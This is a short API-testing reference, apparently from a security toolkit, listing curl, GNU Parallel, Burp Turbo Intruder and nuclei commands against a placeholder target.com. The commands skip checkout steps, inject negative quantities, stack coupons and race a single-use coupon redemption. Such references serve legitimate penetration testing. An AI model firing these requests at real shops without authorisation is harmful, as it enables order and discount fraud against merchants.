<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->
# API Reference — Testing API Business Logic Flaws

## curl — Workflow Bypass
```bash
# Skip checkout steps — go directly to confirmation
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"orderId":"ORDER123"}' https://target.com/api/orders/confirm

# Negative quantity injection
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"productId":"123","quantity":-1}' https://target.com/api/cart/add

# Coupon stacking
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"coupon":"SAVE10"}' https://target.com/api/cart/coupon
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"coupon":"SAVE20"}' https://target.com/api/cart/coupon
```

## GNU Parallel — Race Conditions
```bash
# Concurrent coupon redemption
seq 1 20 | parallel -j 20 \
  'curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"coupon\":\"ONCE50\"}" https://target.com/api/coupon/redeem'
```

## Burp Turbo Intruder — Precise Race Conditions
```
1. Capture POST request in Proxy
2. Send to Turbo Intruder
3. Use race condition template with gate mechanism
4. All requests release simultaneously for precise timing
```

## nuclei — Business Logic Templates
```bash
nuclei -u https://target.com -t http/vulnerabilities/ \
  -H "Authorization: Bearer $TOKEN" -tags business-logic
```
